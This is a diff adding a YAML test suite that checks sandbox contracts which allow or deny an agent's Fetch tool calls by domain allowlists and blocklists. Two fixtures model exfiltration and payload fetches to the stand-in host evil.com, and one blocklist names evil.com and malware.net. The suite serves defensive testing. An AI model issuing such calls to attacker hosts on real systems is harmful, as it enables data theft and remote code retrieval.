@@ -1,0 +1,99 @@
+suite: sandbox-domain
+version: 1
+description: "Sandbox contracts enforcing domain allowlists and blocklists"
+
+fixtures:
+  - id: "sandbox-domain-001"
+    description: "Request to allowed domain passes"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: sandbox-domains
+          type: sandbox
+          tool: "Fetch"
+          within:
+            - "/home/user/project"
+          allows:
+            domains:
+              - "api.example.com"
+              - "cdn.example.com"
+          message: "Network restricted to allowed domains"
+
+    envelope:
+      tool_name: "Fetch"
+      arguments:
+        url: "https://api.example.com/data"
+
+    expected:
+      verdict: allowed
+
+  - id: "sandbox-domain-002"
+    description: "Request to disallowed domain is denied"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: sandbox-domains
+          type: sandbox
+          tool: "Fetch"
+          within:
+            - "/home/user/project"
+          allows:
+            domains:
+              - "api.example.com"
+              - "cdn.example.com"
+          message: "Network restricted to allowed domains"
+
+    envelope:
+      tool_name: "Fetch"
+      arguments:
+        url: "https://evil.com/exfil"
+
+    expected:
+      verdict: denied
+      message_contains: "allowed domains"
+
+  - id: "sandbox-domain-003"
+    description: "not_allows domains blocks specific domain"
+
+    contract:
+      apiVersion: edictum/v1
+      kind: ContractBundle
+      metadata:
+        name: test-bundle
+      defaults:
+        mode: enforce
+      contracts:
+        - id: sandbox-block-domains
+          type: sandbox
+          tool: "Fetch"
+          within:
+            - "/home/user/project"
+          allows:
+            domains:
+              - "*"
+          not_allows:
+            domains:
+              - "evil.com"
+              - "malware.net"
+          message: "Domain is blocked"
+
+    envelope:
+      tool_name: "Fetch"
+      arguments:
+        url: "https://evil.com/payload"
+
+    expected:
+      verdict: denied
+      message_contains: "blocked"
